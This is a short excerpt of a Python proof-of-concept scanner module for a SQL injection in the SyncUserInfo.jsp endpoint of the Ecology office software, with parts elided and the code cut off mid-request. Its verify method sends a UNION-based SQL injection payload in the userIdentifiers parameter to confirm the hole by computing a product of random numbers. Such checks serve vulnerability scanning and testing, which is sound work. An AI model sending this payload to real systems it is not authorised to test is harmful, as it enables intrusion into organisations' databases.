...
# @Time    : 2020-05-24
# @Author  : caicai
# @File    : poc_ecology-syncuserinfo-sqli_2019.py
...
class POC():
    def __init__(self, workdata):
        ...
        self.name = "ecology-syncuserinfo-sqli"
    ...
    def verify(self):
        ...
        req = {
            "method": "GET",
            "url": self.url + "mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str({}*{}),null".format(
                rand2, rand1),
            "timeout": 10,
